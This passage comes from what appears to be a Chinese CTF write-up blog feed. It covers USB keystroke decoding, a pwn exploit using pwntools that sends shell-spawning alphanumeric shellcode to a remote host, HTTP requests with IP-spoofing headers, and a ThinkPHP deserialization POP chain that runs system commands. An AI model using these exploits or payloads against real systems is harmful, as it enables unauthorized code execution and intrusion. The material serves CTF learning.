class="string">"."</span>;          ucasekey[<span class="number">55</span>]=<span class="string">"&gt;"</span></span><br><span class="line">lcasekey[<span class="number">56</span>]=<span class="string">"/"</span>;          ucasekey[<span class="number">56</span>]=<span class="string">"?"</span></span><br><span class="line">lcasekey[<span class="number">57</span>]=<span class="string">"&lt;CapsLock&gt;"</span>;   ucasekey[<span class="number">57</span>]=<span class="string">"&lt;CapsLock&gt;"</span></span><br><span class="line">lcasekey[<span class="number">79</span>]=<span class="string">"&lt;RightArrow&gt;"</span>; ucasekey[<span class="number">79</span>]=<span class="string">"&lt;RightArrow&gt;"</span></span><br><span class="line">lcasekey[<span class="number">80</span>]=<span class="string">"&lt;LeftArrow&gt;"</span>;  ucasekey[<span class="number">80</span>]=<span class="string">"&lt;LeftArrow&gt;"</span></span><br><span class="line">lcasekey[<span class="number">84</span>]=<span class="string">"/"</span>;          ucasekey[<span class="number">84</span>]=<span class="string">"/"</span></span><br><span class="line">lcasekey[<span class="number">85</span>]=<span class="string">"*"</span>;          ucasekey[<span class="number">85</span>]=<span class="string">"*"</span></span><br><span class="line">lcasekey[<span class="number">86</span>]=<span class="string">"-"</span>;          ucasekey[<span class="number">86</span>]=<span class="string">"-"</span></span><br><span class="line">lcasekey[<span class="number">87</span>]=<span class="string">"+"</span>;          ucasekey[<span class="number">87</span>]=<span class="string">"+"</span></span><br><span class="line">lcasekey[<span class="number">88</span>]=<span class="string">"&lt;Enter&gt;"</span>;      ucasekey[<span class="number">88</span>]=<span class="string">"&lt;Enter&gt;"</span></span><br><span class="line">lcasekey[<span class="number">89</span>]=<span class="string">"1"</span>;          ucasekey[<span class="number">89</span>]=<span class="string">"1"</span></span><br><span class="line">lcasekey[<span class="number">90</span>]=<span class="string">"2"</span>;          ucasekey[<span class="number">90</span>]=<span class="string">"2"</span></span><br><span class="line">lcasekey[<span class="number">91</span>]=<span class="string">"3"</span>;          ucasekey[<span class="number">91</span>]=<span class="string">"3"</span></span><br><span class="line">lcasekey[<span class="number">92</span>]=<span class="string">"4"</span>;          ucasekey[<span class="number">92</span>]=<span class="string">"4"</span></span><br><span class="line">lcasekey[<span class="number">93</span>]=<span class="string">"5"</span>;          ucasekey[<span class="number">93</span>]=<span class="string">"5"</span></span><br><span class="line">lcasekey[<span class="number">94</span>]=<span class="string">"6"</span>;          ucasekey[<span class="number">94</span>]=<span class="string">"6"</span></span><br><span class="line">lcasekey[<span class="number">95</span>]=<span class="string">"7"</span>;          ucasekey[<span class="number">95</span>]=<span class="string">"7"</span></span><br><span class="line">lcasekey[<span class="number">96</span>]=<span class="string">"8"</span>;          ucasekey[<span class="number">96</span>]=<span class="string">"8"</span></span><br><span class="line">lcasekey[<span class="number">97</span>]=<span class="string">"9"</span>;          ucasekey[<span class="number">97</span>]=<span class="string">"9"</span></span><br><span class="line">lcasekey[<span class="number">98</span>]=<span class="string">"0"</span>;          ucasekey[<span class="number">98</span>]=<span class="string">"0"</span></span><br><span class="line">lcasekey[<span class="number">99</span>]=<span class="string">"."</span>;          ucasekey[<span class="number">99</span>]=<span class="string">"."</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#make sure filename to open has been provided</span></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">2</span>:</span><br><span class="line">keycodes = open(sys.argv[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keycodes:</span><br><span class="line"><span class="comment">#dump line to bytearray</span></span><br><span class="line">bytesArray = bytearray.fromhex(line.strip())</span><br><span class="line"><span class="comment">#see if we have a key code</span></span><br><span class="line">val = int(bytesArray[<span class="number">2</span>])</span><br><span class="line"><span class="keyword">if</span> val &gt; <span class="number">3</span> <span class="keyword">and</span> val &lt; <span class="number">100</span>:</span><br><span class="line"><span class="comment">#see if left shift or right shift was held down</span></span><br><span class="line"><span class="keyword">if</span> bytesArray[<span class="number">0</span>] == <span class="number">0x02</span> <span class="keyword">or</span> bytesArray[<span class="number">0</span>] == <span class="number">0x20</span> :</span><br><span class="line">print(ucasekey[int(bytesArray[<span class="number">2</span>])], end=<span class="string">''</span>),  <span class="comment">#single line output</span></span><br><span class="line"><span class="comment">#print(ucasekey[int(bytesArray[2])])            #newline output</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(lcasekey[int(bytesArray[<span class="number">2</span>])], end=<span class="string">''</span>),  <span class="comment">#single line output</span></span><br><span class="line"><span class="comment">#print(lcasekey[int(bytesArray[2])])            #newline output</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">"USAGE: python %s [filename]"</span> % os.path.basename(__file__))</span><br></pre></td></tr></table></figure><img src="/2022/05/30/Web-22/20ad031e-436d-4b3e-8b20-942e4bffa63d.png" alt></li></ol><p>提取出来是：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">526172211</span>a<span class="number">0700</span>Cf<span class="number">907300000</span>d<span class="number">00000000000000</span><span class="keyword">c</span><span class="number">4527424943500300000002</span>a<span class="number">00000002</span>b<span class="number">9</span>f<span class="number">9</span>b<span class="number">0530778</span>b<span class="number">5541</span>d<span class="number">33080020000000666</span><span class="keyword">c</span><span class="number">61672e747874</span>b<span class="number">9</span>ba<span class="number">013242</span>f<span class="number">3</span>afc<span class="number">000</span>b<span class="number">092</span><span class="keyword">c</span><span class="number">229</span>d<span class="number">6e994167</span><span class="keyword">c</span><span class="number">05</span>a<span class="number">78708</span>b<span class="number">271</span>ffc<span class="number">042</span>ae<span class="number">3</span>d<span class="number">251e65536</span>f<span class="number">9</span>ada<span class="number">87</span><span class="keyword">c</span><span class="number">77406</span>b<span class="number">67</span>d<span class="number">0e6316684766</span>a<span class="number">86e844</span>dc<span class="number">81</span>aa<span class="number">2</span><span class="keyword">c</span><span class="number">72</span><span class="keyword">c</span><span class="number">71348</span>d<span class="number">10</span><span class="keyword">c</span><span class="number">43</span>d<span class="number">7</span>b<span class="number">00400700</span>e</span><br></pre></td></tr></table></figure><p>看一下头几个字节，是rar压缩包的格式<br><img src="/2022/05/30/Web-22/7e667985-ab12-4c32-bac5-1c905d3fdfeb.png" alt><br>需要密码，再提取一下2.10.1的usb流量，里面的内容就是密码</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">35</span>c535765e50074a</span><br><span class="line">拿到flag</span><br></pre></td></tr></table></figure><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><p><img src="/2022/05/30/Web-22/%E6%88%AA%E5%B1%8F2022-05-29%20%E4%B8%8B%E5%8D%886.44.34.png" alt="截屏2022-05-29 下午6.44.34"></p><p>libc2.33</p><h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><p>首先我们在s处可以输入一个比较大的字符串。</p><p><img src="/2022/05/30/Web-22/%E6%88%AA%E5%B1%8F2022-05-29%20%E4%B8%8B%E5%8D%886.45.35.png" alt="截屏2022-05-29 下午6.45.35"></p><p>参考2021 ciscn game，先逆出程序指令为<code>opt:1\nmsg:ro0t\r\n</code>格式,在下面三个功能中可以发现，mmap申请了一片4096size的可执行空间，并将s的内容拷贝进去，而需要申请首先需要切换至root。</p><p><img src="/2022/05/30/Web-22/%E6%88%AA%E5%B1%8F2022-05-29%20%E4%B8%8B%E5%8D%886.48.44.png" alt="截屏2022-05-29 下午6.48.44"></p><p>并且在最后一句直接执行了s，这里基本可以确定是一个写shellcode的思路了。shellcode的地址储存在rdx寄存器上。</p><p><img src="/2022/05/30/Web-22/%E6%88%AA%E5%B1%8F2022-05-29%20%E4%B8%8B%E5%8D%886.49.50.png" alt="截屏2022-05-29 下午6.49.50"></p><p>这里对我们输入的msg字符串进行了过滤，也就是shellcode必须为可见字符串。之前做过类似的题，可以直接使用工具生成。</p><p><img src="/2022/05/30/Web-22/%E6%88%AA%E5%B1%8F2022-05-29%20%E4%B8%8B%E5%8D%886.51.22.png" alt="截屏2022-05-29 下午6.51.22"></p><p>这里使用<a href="https://github.com/veritas501/ae64的工具，首先使用pwntools模块生成64位shellcode，然后" target="_blank" rel="noopener">https://github.com/veritas501/ae64的工具，首先使用pwntools模块生成64位shellcode，然后</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./login'</span>)</span><br><span class="line"></span><br><span class="line">obj = AE64()</span><br><span class="line">sc = obj.encode(asm(shellcraft.sh()),<span class="string">'rdx'</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(sc)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>​    即可生成shellcode。</p><p>最后的exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">p = remote(<span class="string">"59.110.24.117"</span>,<span class="number">12587</span>)</span><br><span class="line">payload1 = <span class="string">b"opt:1\nmsg:ro0t\r\n"</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>,payload1)</span><br><span class="line">shellcode = <span class="string">b"RXWTYH39Yj3TYfi9WmWZj8TYfi9JBWAXjKTYfi9kCWAYjCTYfi93iWAZj3TYfi9520t800T810T850T860T870T8A0t8B0T8D0T8E0T8F0T8G0T8H0T8P0t8T0T8YRAPZ0t8J0T8M0T8N0t8Q0t8U0t8WZjUTYfi9200t800T850T8P0T8QRAPZ0t81ZjhHpzbinzzzsPHAghriTTI4qTTTT1vVj8nHTfVHAf1RjnXZP"</span></span><br><span class="line">payload2 = <span class="string">b"opt:2\nmsg:"</span> + shellcode + <span class="string">b"\r\n"</span></span><br><span class="line">print(disasm(shellcode))</span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;&gt; "</span>,payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="基于挑战码的双向认证"><a href="#基于挑战码的双向认证" class="headerlink" title="基于挑战码的双向认证"></a>基于挑战码的双向认证</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc <span class="number">123.56</span><span class="number">.111</span><span class="number">.202</span> <span class="number">30465</span></span><br></pre></td></tr></table></figure><p><img src="/2022/05/30/Web-22/e2412878-4605-4372-ac59-07ac64991751.png" alt><br>755权限直接读</p><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">s1 = <span class="string">'1732251413440356045166710055'</span></span><br><span class="line">s2 = <span class="string">'2832531571357564882876880585'</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">result</span>=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(28):</span><br><span class="line">    <span class="attribute">s</span>=str((int(s1[i])+int(s2[i]))%10)</span><br><span class="line">    result+=s</span><br><span class="line"><span class="builtin-name">print</span>(result)</span><br></pre></td></tr></table></figure><p>拿到session</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">GET</span> <span class="string">/send?msg=s</span> <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="attr">Host:</span> <span class="string">eci-2ze7x0b01kqqare1x3cq.cloudeci1.ichunqiu.com:8888</span></span><br><span class="line"><span class="attr">User-Agent:</span> <span class="string">Mozilla/5.0</span> <span class="string">(Macintosh;</span> <span class="string">Intel</span> <span class="string">Mac</span> <span class="string">OS</span> <span class="string">X</span> <span class="string">10_14_6)</span> <span class="string">AppleWebKit/537.36</span> <span class="string">(KHTML,</span> <span class="string">like</span> <span class="string">Gecko)</span> <span class="string">Chrome/101.0.4951.64</span> <span class="string">Safari/537.36</span></span><br><span class="line"><span class="attr">DNT:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">Accept:</span> <span class="string">*/*</span></span><br><span class="line"><span class="attr">Referer:</span> <span class="string">http://eci-2ze7x0b01kqqare1x3cq.cloudeci1.ichunqiu.com:8888/</span></span><br><span class="line"><span class="attr">Accept-Encoding:</span> <span class="string">gzip,</span> <span class="string">deflate</span></span><br><span class="line"><span class="attr">Accept-Language:</span> <span class="string">en,zh-CN;q=0.9,zh;q=0.8,ja;q=0.7</span></span><br><span class="line"><span class="attr">Cookie:</span> <span class="string">Hm_lvt_2d0601bd28de7d49818249cf35d95943=1637642221,1639116265,1639233730;</span> <span class="string">ci_session=f514c6c1942d2d132cc01cfc1d0c1bc54c1ea914;</span> <span class="string">__jsluid_h=5fb2a5f243a8185197d87fda46477685;</span> <span class="string">session=eyJzdGF0dXMiOiJzdGFydCIsInVzZXIiOjEzOTI4ODAxOTY4ODE1MTEzMTM4NTg2MjUzOTczNDgzNzIwMjk0Nn0.YpLppQ.O6BssQxRhhdp7dexJDlmdegZKRc</span></span><br><span class="line"><span class="attr">x-forwarded-for:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="attr">x-originating-ip:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="attr">x-remote-ip:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="attr">x-remote-addr:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="attr">Connection:</span> <span class="string">close</span></span><br></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">GET</span> <span class="string">/send?msg=3564782984797810827932590530</span> <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="attr">Host:</span> <span class="string">eci-2ze7x0b01kqqare1x3cq.cloudeci1.ichunqiu.com:8888</span></span><br><span class="line"><span class="attr">User-Agent:</span> <span class="string">Mozilla/5.0</span> <span class="string">(Macintosh;</span> <span class="string">Intel</span> <span class="string">Mac</span> <span class="string">OS</span> <span class="string">X</span> <span class="string">10_14_6)</span> <span class="string">AppleWebKit/537.36</span> <span class="string">(KHTML,</span> <span class="string">like</span> <span class="string">Gecko)</span> <span class="string">Chrome/101.0.4951.64</span> <span class="string">Safari/537.36</span></span><br><span class="line"><span class="attr">DNT:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">Accept:</span> <span class="string">*/*</span></span><br><span class="line"><span class="attr">Referer:</span> <span class="string">http://eci-2ze7x0b01kqqare1x3cq.cloudeci1.ichunqiu.com:8888/</span></span><br><span class="line"><span class="attr">Accept-Encoding:</span> <span class="string">gzip,</span> <span class="string">deflate</span></span><br><span class="line"><span class="attr">Accept-Language:</span> <span class="string">en,zh-CN;q=0.9,zh;q=0.8,ja;q=0.7</span></span><br><span class="line"><span class="attr">Cookie:</span> <span class="string">Hm_lvt_2d0601bd28de7d49818249cf35d95943=1637642221,1639116265,1639233730;</span> <span class="string">ci_session=f514c6c1942d2d132cc01cfc1d0c1bc54c1ea914;</span> <span class="string">__jsluid_h=5fb2a5f243a8185197d87fda46477685;</span> <span class="string">session=eyJzdGF0dXMiOiJzdGFydCIsInVzZXIiOjEzOTI4ODAxOTY4ODE1MTEzMTM4NTg2MjUzOTczNDgzNzIwMjk0Nn0.YpLppQ.O6BssQxRhhdp7dexJDlmdegZKRc</span></span><br><span class="line"><span class="attr">x-forwarded-for:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="attr">x-originating-ip:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="attr">x-remote-ip:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="attr">x-remote-addr:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="attr">Connection:</span> <span class="string">close</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/a&gt;web&lt;/h2&gt;&lt;h3 id=&quot;Ezpop&quot;&gt;&lt;a href=&quot;#Ezpop&quot; class=&quot;headerlink&quot; title=&quot;Ezpop&quot;&gt;&lt;/a&gt;Ezpop&lt;/h3&gt;&lt;p&gt;题目内容：最近，小明在学习php开发，于是下载了thinkphp的最新版，但是却被告知最新版本存在漏洞，你能找到漏洞在哪里吗？&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;namespace&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;think&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;title&quot;&gt;abstract&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Model&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;title&quot;&gt;private&lt;/span&gt; $&lt;span class=&quot;title&quot;&gt;lazySave&lt;/span&gt; = &lt;span class=&quot;title&quot;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; $data = [];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; $exists = &lt;span class=&quot;keyword&quot;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;protected&lt;/span&gt; $table;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; $withAttr = [];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;protected&lt;/span&gt; $json = [];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;protected&lt;/span&gt; $jsonAssoc = &lt;span class=&quot;keyword&quot;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;__construct&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;($obj = &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;lazySave = &lt;span class=&quot;keyword&quot;&gt;True&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;data = [&lt;span class=&quot;string&quot;&gt;&#39;whoami&#39;&lt;/span&gt; =&amp;gt; [&lt;span class=&quot;string&quot;&gt;&#39;cat /flag.txt&#39;&lt;/span&gt;]];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;exists = &lt;span class=&quot;keyword&quot;&gt;True&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;table = $obj;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;withAttr = [&lt;span class=&quot;string&quot;&gt;&#39;whoami&#39;&lt;/span&gt; =&amp;gt; [&lt;span class=&quot;string&quot;&gt;&#39;system&#39;&lt;/span&gt;]];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;json = [&lt;span class=&quot;string&quot;&gt;&#39;whoami&#39;&lt;/span&gt;,[&lt;span class=&quot;string&quot;&gt;&#39;whoami&#39;&lt;/span&gt;]];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;jsonAssoc = &lt;span class=&quot;keyword&quot;&gt;True&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;namespace&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;think&lt;/span&gt;\&lt;span class=&quot;title&quot;&gt;model&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;title&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;think&lt;/span&gt;\&lt;span class=&quot;title&quot;&gt;Model&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Pivot&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;extends&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Model&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;namespace&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;title&quot;&gt;echo&lt;/span&gt;(&lt;span class=&quot;title&quot;&gt;urlencode&lt;/span&gt;(&lt;span class=&quot;title&quot;&gt;serialize&lt;/span&gt;(&lt;span class=&quot;title&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;think&lt;/span&gt;\&lt;span class=&quot;title&quot;&gt;model&lt;/span&gt;\&lt;span class=&quot;title&quot;&gt;Pivot&lt;/span&gt;(&lt;span class=&quot;title&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;think&lt;/span&gt;\&lt;span class=&quot;title&quot;&gt;model&lt;/span&gt;\&lt;span class=&quot;title&quot;&gt;Pivot&lt;/span&gt;()))));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
    
      <category term="Web" scheme="https://jlkl.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Agent Memory Shell</title>
    <link href="https://jlkl.github.io/2022/05/26/Java-10/"/>
    <id>https://jlkl.github.io/2022/05/26/Java-10/</id>
    <published>2022-05-26T01:45:25.000Z</published>
    <updated>2022-05-26T01:49:00.237Z</updated>
    
